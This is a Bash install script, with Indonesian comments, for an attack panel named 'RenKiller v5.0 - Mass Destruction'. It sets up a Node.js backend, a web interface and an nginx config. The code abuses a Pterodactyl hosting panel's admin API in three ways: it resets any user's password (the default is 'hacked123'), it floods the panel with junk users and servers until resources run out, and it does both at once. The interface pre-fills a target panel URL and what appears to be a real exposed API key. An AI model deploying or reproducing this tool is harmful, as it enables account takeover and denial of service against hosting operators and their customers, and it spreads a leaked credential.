#!/bin/bash
# ==========================================
# 💀 RenKiller v5.0 - MASS DESTRUCTION
# Flood User • Flood Server • Change Pass
# ==========================================

RED='\033[0;31m'; GREEN='\033[0;32m'; CYAN='\033[0;36m'; YELLOW='\033[1;33m'; NC='\033[0m'
[[ $EUID -ne 0 ]] && { echo -e "${RED}❌ Harus root!${NC}"; exit 1; }

DOMAIN="killer.googleclient.biz.id"
WEB_ROOT="/var/www/$DOMAIN/public"
NODE_DIR="/opt/renkiller"
NGINX_CONF="/etc/nginx/sites-available/$DOMAIN"

echo -e "${YELLOW}⏳ Memulai Update RenKiller v5.0...${NC}"

# ==========================================
# 1. UPDATE BACKEND (NODE.JS) - FULL FITUR
# ==========================================
echo -e "${CYAN}[1/4] Update Backend (Flood User, Flood Server)...${NC}"
mkdir -p "$NODE_DIR" "$WEB_ROOT"
cd "$NODE_DIR"

cat > package.json << 'EOF'
{
  "name": "renkiller-backend",
  "version": "5.0.0",
  "main": "server.js",
  "dependencies": {
    "express": "^4.19.2",
    "cors": "^2.8.5",
    "axios": "^1.7.2"
  }
}
EOF
npm install --silent >/dev/null 2>&1

cat > "$NODE_DIR/server.js" << 'NODEEOF'
const express = require('express');
const axios = require('axios');
const cors = require('cors');
const app = express();
app.use(cors()); app.use(express.json());

const makeApi = (panelUrl, apiKey) => axios.create({
    baseURL: `${panelUrl}/api/application`,
    headers: { 'Authorization': `Bearer ${apiKey}`, 'Content-Type': 'application/json', 'Accept': 'Application/vnd.pterodactyl.v1+json' },
    timeout: 20000
});

// 1. GET STATS
app.post('/api/stats', async (req, res) => {
    const { panelUrl, apiKey } = req.body;
    try {
        const api = makeApi(panelUrl, apiKey);
        const [usersRes, serversRes] = await Promise.all([api.get('/users?per_page=1'), api.get('/servers?per_page=1')]);
        let freeAllocs = 0;
        try {
            let page = 1;
            while(true) {
                const allocRes = await api.get(`/nodes/1/allocations?per_page=500&page=${page}`);
                freeAllocs += allocRes.data.data.filter(a => !a.attributes.assigned).length;
                if (page >= allocRes.data.meta.pagination.total_pages) break;
                page++;
            }
        } catch(e) { freeAllocs = 'N/A'; }
        res.json({ status: true, totalUsers: usersRes.data.meta.pagination.total, totalServers: serversRes.data.meta.pagination.total, freeAllocs });
    } catch (error) { res.json({ status: false, message: error.message }); }
});

// 2. CHANGEPASS BY ID
app.post('/api/changepass', async (req, res) => {
    const { panelUrl, apiKey, userId, newPassword } = req.body;
    try {
        const api = makeApi(panelUrl, apiKey);
        await api.patch(`/users/${userId}`, { password: newPassword });
        res.json({ status: true, message: "Password berhasil diganti!" });
    } catch (error) { res.json({ status: false, message: error.response?.data?.errors?.[0]?.detail || error.message }); }
});

// 3. FLOOD USER
app.post('/api/flood-user', async (req, res) => {
    const { panelUrl, apiKey, targetCount, password } = req.body;
    res.setHeader('Content-Type', 'text/event-stream'); res.setHeader('Cache-Control', 'no-cache'); res.setHeader('Connection', 'keep-alive');
    const sendLog = (msg, type = 'info') => res.write(`data: ${JSON.stringify({ msg, type })}\n\n`);
    const api = makeApi(panelUrl, apiKey);
    const randName = (len = 8) => { let s = ''; const chars = 'abcdefghijklmnopqrstuvwxyz0123456789'; for (let i = 0; i < len; i++) s += chars[Math.floor(Math.random() * chars.length)]; return s; };
    
    sendLog(`Memulai Flood User (${targetCount} akun)...`, 'warn');
    let success = 0, failed = 0;
    for (let i = 1; i <= targetCount; i++) {
        const username = randName(8); const email = `${username}@renkiller.local`;
        try {
            await api.post('/users', { email, username, first_name: username, last_name: "Killer", password });
            sendLog(`[${i}/${targetCount}] User ${username} Created!`, 'success'); success++;
        } catch (err) { sendLog(`[${i}/${targetCount}] Gagal: ${err.response?.data?.errors?.[0]?.detail || err.message}`, 'error'); failed++; }
    }
    sendLog(`FLOOD USER SELESAI! Sukses: ${success} | Gagal: ${failed}`, 'success');
    res.write(`data: [DONE]\n\n`); res.end();
});

// 4. FLOOD SERVER
app.post('/api/flood-server', async (req, res) => {
    const { panelUrl, apiKey, targetCount, userId, nestId, eggId, memory, disk, cpu } = req.body;
    res.setHeader('Content-Type', 'text/event-stream'); res.setHeader('Cache-Control', 'no-cache'); res.setHeader('Connection', 'keep-alive');
    const sendLog = (msg, type = 'info') => res.write(`data: ${JSON.stringify({ msg, type })}\n\n`);
    const api = makeApi(panelUrl, apiKey);
    const randName = (len = 8) => { let s = ''; const chars = 'abcdefghijklmnopqrstuvwxyz0123456789'; for (let i = 0; i < len; i++) s += chars[Math.floor(Math.random() * chars.length)]; return s; };
    
    sendLog(`Memulai Flood Server (${targetCount} server)...`, 'warn');
    let allocations = [];
    try {
        let page = 1;
        while(true) {
            const allocRes = await api.get(`/nodes/1/allocations?per_page=500&page=${page}`);
            allocations.push(...allocRes.data.data.filter(a => !a.attributes.assigned).map(a => a.attributes.id));
            if (page >= allocRes.data.meta.pagination.total_pages) break;
            page++;
        }
    } catch (e) { sendLog(`Gagal ambil allocation: ${e.message}`, 'error'); return res.end(); }
    
    if (allocations.length === 0) { sendLog(`Allocation habis!`, 'error'); return res.end(); }
    sendLog(`Tersedia ${allocations.length} Allocation kosong.`, 'success');
    
    let success = 0, failed = 0;
    for (let i = 1; i <= targetCount; i++) {
        if (allocations.length === 0) { sendLog(`Allocation habis.`, 'error'); break; }
        const srvName = `srv-${randName(6)}`; const allocId = allocations.shift();
        try {
            await api.post('/servers', {
                name: srvName, user: parseInt(userId), nest: parseInt(nestId), egg: parseInt(eggId),
                docker_image: "ghcr.io/parkervcp/yolks:nodejs_18", startup: "node index.js", environment: {},
                limits: { memory: parseInt(memory), swap: 0, disk: parseInt(disk), io: 500, cpu: parseInt(cpu) },
                feature_limits: { databases: 0, backups: 0, allocations: 1 }, allocation: { default: allocId }, start_on_completion: false
            });
            sendLog(`[${i}/${targetCount}] Server ${srvName} Created!`, 'success'); success++;
        } catch (err) { sendLog(`[${i}/${targetCount}] Gagal: ${err.response?.data?.errors?.[0]?.detail || err.message}`, 'error'); failed++; }
    }
    sendLog(`FLOOD SERVER SELESAI! Sukses: ${success} | Gagal: ${failed}`, 'success');
    res.write(`data: [DONE]\n\n`); res.end();
});

// 5. FLOOD ALL (USER + SERVER)
app.post('/api/flood-all', async (req, res) => {
    const { panelUrl, apiKey, targetCount, nestId, eggId, memory, disk, cpu, password } = req.body;
    res.setHeader('Content-Type', 'text/event-stream'); res.setHeader('Cache-Control', 'no-cache'); res.setHeader('Connection', 'keep-alive');
    const sendLog = (msg, type = 'info') => res.write(`data: ${JSON.stringify({ msg, type })}\n\n`);
    const api = makeApi(panelUrl, apiKey);
    const randName = (len = 8) => { let s = ''; const chars = 'abcdefghijklmnopqrstuvwxyz0123456789'; for (let i = 0; i < len; i++) s += chars[Math.floor(Math.random() * chars.length)]; return s; };
    
    sendLog(`Memulai Flood ALL (${targetCount} User+Server)...`, 'warn');
    let allocations = [];
    try {
        let page = 1;
        while(true) {
            const allocRes = await api.get(`/nodes/1/allocations?per_page=500&page=${page}`);
            allocations.push(...allocRes.data.data.filter(a => !a.attributes.assigned).map(a => a.attributes.id));
            if (page >= allocRes.data.meta.pagination.total_pages) break;
            page++;
        }
    } catch (e) { sendLog(`Gagal ambil allocation: ${e.message}`, 'error'); return res.end(); }
    
    if (allocations.length === 0) { sendLog(`Allocation habis!`, 'error'); return res.end(); }
    
    let success = 0, failed = 0;
    for (let i = 1; i <= targetCount; i++) {
        if (allocations.length === 0) { sendLog(`Allocation habis.`, 'error'); break; }
        const username = randName(8); const email = `${username}@renkiller.local`; const allocId = allocations.shift();
        sendLog(`[${i}/${targetCount}] Create User: ${username}`, 'info');
        let userId = null;
        try {
            const uRes = await api.post('/users', { email, username, first_name: username, last_name: "Killer", password });
            userId = uRes.data.attributes.id; sendLog(`User ${username} (ID: ${userId}) Created`, 'success');
        } catch (err) { sendLog(`User Fail: ${err.response?.data?.errors?.[0]?.detail || err.message}`, 'error'); failed++; continue; }
        try {
            await api.post('/servers', {
                name: `srv-${username}`, user: userId, nest: parseInt(nestId), egg: parseInt(eggId),
                docker_image: "ghcr.io/parkervcp/yolks:nodejs_18", startup: "node index.js", environment: {},
                limits: { memory: parseInt(memory), swap: 0, disk: parseInt(disk), io: 500, cpu: parseInt(cpu) },
                feature_limits: { databases: 0, backups: 0, allocations: 1 }, allocation: { default: allocId }, start_on_completion: false
            });
            sendLog(`Server ${username} Created!`, 'success'); success++;
        } catch (err) {
            sendLog(`Server Fail: ${err.response?.data?.errors?.[0]?.detail || err.message}`, 'error'); failed++;
            try { await api.delete(`/users/${userId}`); } catch(e){}
        }
    }
    sendLog(`FLOOD ALL SELESAI! Sukses: ${success} | Gagal: ${failed}`, 'success');
    res.write(`data: [DONE]\n\n`); res.end();
});

app.listen(3000, '127.0.0.1', () => console.log('✅ Backend on port 3000'));
NODEEOF

# Restart Service Node
systemctl daemon-reload
systemctl restart renkiller
echo -e "${GREEN}  ✅ Backend Updated${NC}"

# ==========================================
# 2. UPDATE FRONTEND (UI + TABS LOG)
# ==========================================
echo -e "${CYAN}[2/4] Update Frontend (Flood Tabs & Animasi)...${NC}"
cat > "$WEB_ROOT/index.php" << 'PHPEOF'
<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>RenKiller v5.0 - Mass Destruction</title>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Inter:wght@400;600;800&display=swap" rel="stylesheet">
<style>
    :root { 
        --bg: #050505; --card: #111111; --border: #2a2a2a; --text: #fff; --muted: #888; 
        --primary: #ff0033; --primary-glow: rgba(255,0,51,0.4); 
        --success: #00ff66; --success-glow: rgba(0,255,102,0.4); 
        --warning: #ffcc00; --blue: #0088ff; 
    }
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body { background: var(--bg); color: var(--text); font-family: 'Inter', sans-serif; display: flex; justify-content: center; padding: 20px; min-height: 100vh; background-image: radial-gradient(circle at 50% 0%, rgba(255,0,51,0.05) 0%, transparent 50%); }
    .container { width: 100%; max-width: 1000px; animation: fadeIn 0.8s ease-out; }
    @keyframes fadeIn { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }

    /* HEADER */
    .header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 25px; padding-bottom: 15px; border-bottom: 1px solid var(--border); }
    .header-left h1 { font-family: 'JetBrains Mono', monospace; font-size: 1.8em; color: var(--primary); text-shadow: 0 0 20px var(--primary-glow); display: flex; align-items: center; gap: 10px; }
    .header-left p { color: var(--muted); font-size: 0.8em; letter-spacing: 2px; font-family: 'JetBrains Mono', monospace; margin-top: 5px; }
    .header-right { display: flex; align-items: center; gap: 10px; font-family: 'JetBrains Mono', monospace; font-size: 0.85em; color: var(--success); background: rgba(0,255,102,0.1); padding: 8px 15px; border-radius: 50px; border: 1px solid var(--success-glow); }
    .dot-blink { width: 8px; height: 8px; background: var(--success); border-radius: 50%; box-shadow: 0 0 10px var(--success); animation: blink 1s infinite alternate; }
    @keyframes blink { from { opacity: 0.3; } to { opacity: 1; } }

    /* STATS */
    .stats-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 15px; margin-bottom: 25px; }
    .stat-box { background: var(--card); border: 1px solid var(--border); border-radius: 12px; padding: 20px; position: relative; overflow: hidden; transition: 0.3s; display: flex; align-items: center; gap: 15px; }
    .stat-box:hover { transform: translateY(-5px); box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
    .stat-box i { font-size: 2.2em; color: var(--muted); opacity: 0.5; }
    .stat-box .info h3 { font-size: 0.75em; color: var(--muted); text-transform: uppercase; letter-spacing: 1.5px; margin-bottom: 5px; }
    .stat-box .info .num { font-family: 'JetBrains Mono', monospace; font-size: 1.8em; font-weight: 700; color: #fff; }
    .stat-box::before { content: ''; position: absolute; left: 0; top: 0; bottom: 0; width: 4px; }
    .stat-box.users::before { background: var(--blue); box-shadow: 0 0 15px var(--blue); }
    .stat-box.servers::before { background: var(--primary); box-shadow: 0 0 15px var(--primary); }
    .stat-box.allocs::before { background: var(--success); box-shadow: 0 0 15px var(--success); }

    /* LAYOUT GRID */
    .grid-2 { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; margin-bottom: 25px; }
    .card { background: var(--card); border: 1px solid var(--border); border-radius: 12px; padding: 25px; transition: 0.3s; }
    .card:hover { border-color: #444; }
    .card h3 { font-family: 'JetBrains Mono', monospace; font-size: 0.95em; margin-bottom: 20px; color: #fff; display: flex; align-items: center; gap: 10px; border-bottom: 1px solid var(--border); padding-bottom: 15px; }
    .card h3 i { color: var(--primary); }

    /* FORM */
    .form-group { margin-bottom: 15px; }
    label { display: block; font-size: 0.75em; color: var(--muted); margin-bottom: 8px; font-family: 'JetBrains Mono', monospace; text-transform: uppercase; }
    input, select { width: 100%; background: #000; border: 1px solid var(--border); color: var(--text); padding: 12px 15px; border-radius: 8px; font-family: 'JetBrains Mono', monospace; outline: none; transition: 0.3s; font-size: 0.9em; }
    input:focus, select:focus { border-color: var(--primary); box-shadow: 0 0 15px var(--primary-glow); }

    /* BUTTON */
    .btn { width: 100%; padding: 14px; border: none; border-radius: 8px; font-weight: 800; cursor: pointer; transition: 0.3s; font-family: 'Inter', sans-serif; text-transform: uppercase; letter-spacing: 1px; display: flex; justify-content: center; gap: 10px; align-items: center; font-size: 0.9em; }
    .btn-primary { background: var(--primary); color: white; box-shadow: 0 4px 15px var(--primary-glow); }
    .btn-primary:hover { background: #cc0029; transform: translateY(-2px); box-shadow: 0 6px 20px var(--primary-glow); }
    .btn-primary:disabled { opacity: 0.6; cursor: not-allowed; transform: none; }
    .btn-warning { background: var(--warning); color: black; }
    .btn-warning:hover { background: #e6b800; transform: translateY(-2px); }

    /* SPINNER */
    .fa-spinner { animation: spin 1s linear infinite; }
    @keyframes spin { 100% { transform: rotate(360deg); } }
    .dots::after { content: ''; animation: dots 1.5s steps(4, end) infinite; }
    @keyframes dots { 0%, 20% { content: ''; } 40% { content: '.'; } 60% { content: '..'; } 80%, 100% { content: '...'; } }

    /* TABS */
    .tabs { display: flex; gap: 10px; margin-bottom: 20px; border-bottom: 1px solid var(--border); padding-bottom: 10px; }
    .tab-btn { background: transparent; color: var(--muted); border: none; padding: 10px 15px; font-family: 'JetBrains Mono', monospace; font-size: 0.85em; cursor: pointer; border-radius: 8px 8px 0 0; transition: 0.3s; }
    .tab-btn.active { color: var(--primary); background: rgba(255,0,51,0.1); font-weight: 700; }
    .tab-content { display: none; }
    .tab-content.active { display: block; animation: fadeIn 0.5s; }

    /* TERMINAL */
    .terminal { background: #000; border: 1px solid var(--border); border-radius: 12px; padding: 20px; height: 300px; overflow-y: auto; font-family: 'JetBrains Mono', monospace; font-size: 0.85em; line-height: 1.6; box-shadow: inset 0 0 20px rgba(0,0,0,0.8); border-top: 3px solid var(--primary); }
    .terminal::-webkit-scrollbar { width: 6px; }
    .terminal::-webkit-scrollbar-thumb { background: #333; border-radius: 4px; }
    .log-info { color: #ccc; }
    .log-success { color: var(--success); }
    .log-error { color: var(--primary); }
    .log-warn { color: var(--warning); }
    .log-time { color: #555; margin-right: 10px; }

    /* RESPONSIVE */
    @media (max-width: 768px) {
        .stats-grid { grid-template-columns: 1fr; }
        .grid-2 { grid-template-columns: 1fr; }
        .header { flex-direction: column; align-items: flex-start; gap: 15px; }
        .header-right { align-self: flex-start; }
        .tabs { flex-wrap: wrap; }
    }
</style>
</head>
<body>
<div class="container">
    <div class="header">
        <div class="header-left">
            <h1><i class="fas fa-skull-crossbones"></i> RenKiller v5.0</h1>
            <p>MASS DESTRUCTION PANEL</p>
        </div>
        <div class="header-right"><div class="dot-blink"></div> SYSTEM ONLINE</div>
    </div>

    <div class="stats-grid">
        <div class="stat-box users"><i class="fas fa-users"></i><div class="info"><h3>Total User</h3><div class="num" id="statUsers">-</div></div></div>
        <div class="stat-box servers"><i class="fas fa-server"></i><div class="info"><h3>Total Server</h3><div class="num" id="statServers">-</div></div></div>
        <div class="stat-box allocs"><i class="fas fa-network-wired"></i><div class="info"><h3>Free Alloc</h3><div class="num" id="statAllocs">-</div></div></div>
    </div>

    <div class="grid-2">
        <div class="card">
            <h3><i class="fas fa-cog"></i> Target Panel</h3>
            <div class="form-group"><label>Panel URL</label><input type="text" id="panelUrl" value="https://vvipbokep.naaofficial.me"></div>
            <div class="form-group"><label>API Key</label><input type="password" id="apiKey" value="ptla_qvu094TMhapXMajTiLE4FxZPo3ZqwghhAPxkb1VXQxh"></div>
            <button class="btn btn-warning" onclick="fetchStats()" id="btnStats"><i class="fas fa-sync-alt"></i> Cek Koneksi</button>
        </div>

        <div class="card">
            <h3><i class="fas fa-user-secret"></i> Change Password by ID</h3>
            <div class="form-group"><label>User ID Target</label><input type="number" id="userId" value="1"></div>
            <div class="form-group"><label>Password Baru</label><input type="text" id="newPassword" value="hacked123"></div>
            <button class="btn btn-warning" onclick="changePass()" id="btnPass"><i class="fas fa-key"></i> Ubah Password</button>
        </div>
    </div>

    <!-- FLOOD TABS -->
    <div class="card" style="margin-bottom: 25px;">
        <div class="tabs">
            <button class="tab-btn active" onclick="showTab('tab-user', event)"><i class="fas fa-user-plus"></i> Flood User</button>
            <button class="tab-btn" onclick="showTab('tab-server', event)"><i class="fas fa-server"></i> Flood Server</button>
            <button class="tab-btn" onclick="showTab('tab-all', event)"><i class="fas fa-bomb"></i> Flood All</button>
        </div>

        <!-- FLOOD USER -->
        <div id="tab-user" class="tab-content active">
            <h3><i class="fas fa-users"></i> Buat Banyak User</h3>
            <div class="form-group"><label>Jumlah User</label><input type="number" id="fUserCount" value="10"></div>
            <div class="form-group"><label>Password Default</label><input type="text" id="fUserPass" value="12345678"></div>
            <button class="btn btn-primary" onclick="startFlood('user')" id="btnFloodUser"><i class="fas fa-rocket"></i> MULAI FLOOD USER</button>
        </div>

        <!-- FLOOD SERVER -->
        <div id="tab-server" class="tab-content">
            <h3><i class="fas fa-server"></i> Buat Banyak Server</h3>
            <div class="grid-2">
                <div class="form-group"><label>Jumlah Server</label><input type="number" id="fSrvCount" value="10"></div>
                <div class="form-group"><label>User ID Owner</label><input type="number" id="fSrvUserId" value="1"></div>
            </div>
            <div class="grid-2">
                <div class="form-group"><label>Nest ID</label><input type="number" id="fSrvNest" value="5"></div>
                <div class="form-group"><label>Egg ID</label><input type="number" id="fSrvEgg" value="15"></div>
            </div>
            <div class="grid-2">
                <div class="form-group"><label>RAM (MB)</label><input type="number" id="fSrvRam" value="1024"></div>
                <div class="form-group"><label>Disk (MB)</label><input type="number" id="fSrvDisk" value="2048"></div>
            </div>
            <div class="form-group"><label>CPU (%)</label><input type="number" id="fSrvCpu" value="100"></div>
            <button class="btn btn-primary" onclick="startFlood('server')" id="btnFloodServer"><i class="fas fa-rocket"></i> MULAI FLOOD SERVER</button>
        </div>

        <!-- FLOOD ALL -->
        <div id="tab-all" class="tab-content">
            <h3><i class="fas fa-bomb"></i> Buat User + Server</h3>
            <div class="grid-2">
                <div class="form-group"><label>Jumlah Target</label><input type="number" id="fAllCount" value="10"></div>
                <div class="form-group"><label>Password Default</label><input type="text" id="fAllPass" value="12345678"></div>
            </div>
            <div class="grid-2">
                <div class="form-group"><label>Nest ID</label><input type="number" id="fAllNest" value="5"></div>
                <div class="form-group"><label>Egg ID</label><input type="number" id="fAllEgg" value="15"></div>
            </div>
            <div class="grid-2">
                <div class="form-group"><label>RAM (MB)</label><input type="number" id="fAllRam" value="1024"></div>
                <div class="form-group"><label>Disk (MB)</label><input type="number" id="fAllDisk" value="2048"></div>
            </div>
            <div class="form-group"><label>CPU (%)</label><input type="number" id="fAllCpu" value="100"></div>
            <button class="btn btn-primary" onclick="startFlood('all')" id="btnFloodAll"><i class="fas fa-rocket"></i> MULAI FLOOD ALL</button>
        </div>
    </div>

    <!-- TERMINAL LOG -->
    <div class="terminal" id="terminal">
        <div class="log-info"><span class="log-time">[SYSTEM]</span> Terminal siap...</div>
    </div>
</div>

<script>
const API_BACKEND = window.location.origin + '/api-killer';

function log(msg, type = 'info') { 
    const term = document.getElementById('terminal'); 
    const time = new Date().toLocaleTimeString(); 
    const div = document.createElement('div'); 
    div.className = `log-${type}`; 
    div.innerHTML = `<span class="log-time">[${time}]</span> ${msg}`; 
    term.appendChild(div); 
    term.scrollTop = term.scrollHeight; 
}

function showTab(id, evt) {
    document.querySelectorAll('.tab-content').forEach(el => el.classList.remove('active'));
    document.querySelectorAll('.tab-btn').forEach(el => el.classList.remove('active'));
    document.getElementById(id).classList.add('active');
    evt.currentTarget.classList.add('active');
}

async function fetchStats() { 
    const btn = document.getElementById('btnStats'); 
    btn.innerHTML = '<i class="fas fa-spinner"></i> Loading...'; 
    btn.disabled = true; 
    const panelUrl = document.getElementById('panelUrl').value; 
    const apiKey = document.getElementById('apiKey').value; 
    document.getElementById('statUsers').innerHTML = '<span class="dots"></span>'; 
    document.getElementById('statServers').innerHTML = '<span class="dots"></span>'; 
    document.getElementById('statAllocs').innerHTML = '<span class="dots"></span>'; 
    try { 
        const res = await fetch(`${API_BACKEND}/stats`, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ panelUrl, apiKey }) }); 
        const data = await res.json(); 
        if(data.status) { 
            document.getElementById('statUsers').innerText = data.totalUsers; 
            document.getElementById('statServers').innerText = data.totalServers; 
            document.getElementById('statAllocs').innerText = data.freeAllocs; 
            log('Sinkronisasi panel berhasil!', 'success'); 
        } else { 
            log('Gagal load stats: ' + data.message, 'error'); 
            document.getElementById('statUsers').innerText = 'ERR'; 
        } 
    } catch(e) { 
        log('Koneksi error: ' + e.message, 'error'); 
        document.getElementById('statUsers').innerText = 'ERR'; 
    } 
    btn.innerHTML = '<i class="fas fa-sync-alt"></i> Cek Koneksi'; 
    btn.disabled = false; 
}

async function changePass() { 
    const btn = document.getElementById('btnPass'); 
    btn.innerHTML = '<i class="fas fa-spinner"></i> Proses...'; 
    btn.disabled = true; 
    const panelUrl = document.getElementById('panelUrl').value; 
    const apiKey = document.getElementById('apiKey').value; 
    const userId = document.getElementById('userId').value; 
    const newPassword = document.getElementById('newPassword').value; 
    log(`Hack user ID ${userId}...`, 'warn'); 
    try { 
        const res = await fetch(`${API_BACKEND}/changepass`, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ panelUrl, apiKey, userId, newPassword }) }); 
        const data = await res.json(); 
        if(data.status) log(`SUKSES! Password user ${userId} jadi: ${newPassword}`, 'success'); 
        else log(`GAGAL: ${data.message}`, 'error'); 
    } catch(e) { log(`Error: ${e.message}`, 'error'); } 
    btn.innerHTML = '<i class="fas fa-key"></i> Ubah Password'; 
    btn.disabled = false; 
}

async function startFlood(type) {
    const panelUrl = document.getElementById('panelUrl').value;
    const apiKey = document.getElementById('apiKey').value;
    let btn, endpoint, payload;

    if (type === 'user') {
        btn = document.getElementById('btnFloodUser');
        endpoint = '/flood-user';
        payload = { panelUrl, apiKey, targetCount: document.getElementById('fUserCount').value, password: document.getElementById('fUserPass').value };
    } else if (type === 'server') {
        btn = document.getElementById('btnFloodServer');
        endpoint = '/flood-server';
        payload = { panelUrl, apiKey, targetCount: document.getElementById('fSrvCount').value, userId: document.getElementById('fSrvUserId').value, nestId: document.getElementById('fSrvNest').value, eggId: document.getElementById('fSrvEgg').value, memory: document.getElementById('fSrvRam').value, disk: document.getElementById('fSrvDisk').value, cpu: document.getElementById('fSrvCpu').value };
    } else {
        btn = document.getElementById('btnFloodAll');
        endpoint = '/flood-all';
        payload = { panelUrl, apiKey, targetCount: document.getElementById('fAllCount').value, password: document.getElementById('fAllPass').value, nestId: document.getElementById('fAllNest').value, eggId: document.getElementById('fAllEgg').value, memory: document.getElementById('fAllRam').value, disk: document.getElementById('fAllDisk').value, cpu: document.getElementById('fAllCpu').value };
    }

    btn.disabled = true;
    btn.innerHTML = '<i class="fas fa-spinner"></i> PROSES...';
    log(`Memulai Flood ${type.toUpperCase()}...`, 'warn');

    try {
        const response = await fetch(`${API_BACKEND}${endpoint}`, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(payload) });
        const reader = response.body.getReader();
        const decoder = new TextDecoder();
        while (true) {
            const { value, done } = await reader.read();
            if (done) break;
            const chunk = decoder.decode(value);
            const lines = chunk.split('\n\n');
            for (const line of lines) {
                if (line.startsWith('data: ')) {
                    const dataStr = line.replace('data: ', '');
                    if (dataStr === '[DONE]') { log('Flood Selesai.', 'success'); break; }
                    try { const data = JSON.parse(dataStr); log(data.msg, data.type); } catch(e) {}
                }
            }
        }
    } catch(e) { log('Koneksi terputus: ' + e.message, 'error'); }

    btn.disabled = false;
    btn.innerHTML = `<i class="fas fa-rocket"></i> MULAI FLOOD ${type.toUpperCase()}`;
    fetchStats();
}

window.onload = () => { log('System initialized. Menghubungkan ke panel...', 'info'); fetchStats(); };
</script>
</body>
</html>
PHPEOF

# ==========================================
# 3. FIX NGINX
# ==========================================
echo -e "${CYAN}[3/4] Fix Nginx Config...${NC}"
if [ -S "/var/run/php/php8.3-fpm.sock" ]; then PHP_SOCK="php8.3-fpm.sock";
elif [ -S "/var/run/php/php8.2-fpm.sock" ]; then PHP_SOCK="php8.2-fpm.sock";
elif [ -S "/var/run/php/php8.1-fpm.sock" ]; then PHP_SOCK="php8.1-fpm.sock";
else PHP_SOCK="php8.1-fpm.sock"; fi

cat > "$NGINX_CONF" << NGINXEOF
server {
    listen 80; listen [::]:80;
    server_name $DOMAIN;
    root $WEB_ROOT; index index.php index.html;

    location / { try_files \$uri \$uri/ /index.php?\$query_string; }
    
    location /api-killer/ {
        proxy_pass http://127.0.0.1:3000/;
        proxy_http_version 1.1;
        proxy_set_header Upgrade \$http_upgrade;
        proxy_set_header Connection 'upgrade';
        proxy_set_header Host \$host;
        proxy_cache_bypass \$http_upgrade;
        proxy_buffering off;
    }
    
    location ~ \.php\$ {
        include snippets/fastcgi-php.conf;
        fastcgi_pass unix:/var/run/php/$PHP_SOCK;
        fastcgi_read_timeout 300;
    }
}
NGINXEOF

ln -sf "$NGINX_CONF" /etc/nginx/sites-enabled/
rm -f /etc/nginx/sites-enabled/default
nginx -t >/dev/null 2>&1 && systemctl reload nginx
echo -e "${GREEN}  ✅ Nginx OK${NC}"

# ==========================================
# 4. FINALISASI
# ==========================================
echo -e "${CYAN}[4/4] Restart Service...${NC}"
chown -R www-data:www-data "/var/www/$DOMAIN"
systemctl restart php*-fpm 2>/dev/null
systemctl restart nginx
systemctl restart renkiller

echo -e "${GREEN}╔════════════════════════════════════════════════╗${NC}"
echo -e "${GREEN}║  ✅ RenKiller v5.0 BERHASIL DI-UPDATE!         ║${NC}"
echo -e "${GREEN}║  🚀 Flood User • Flood Server • Flood All      ║${NC}"
echo -e "${GREEN}╚════════════════════════════════════════════════╝${NC}"
echo ""
echo -e "${CYAN}🔗 Buka Web:${NC} http://$DOMAIN"
echo ""
echo -e "${YELLOW}💡 Fitur Baru:${NC}"
echo -e "   • Flood User: Bikin user doang tanpa server."
echo -e "   • Flood Server: Bikin server pake User ID yg udah ada."
echo -e "   • Flood All: Bikin User + Server sekaligus."
echo -e "   • Tab Menu di dalam Card Flood."
echo -e "   • Terminal Log Real-time."
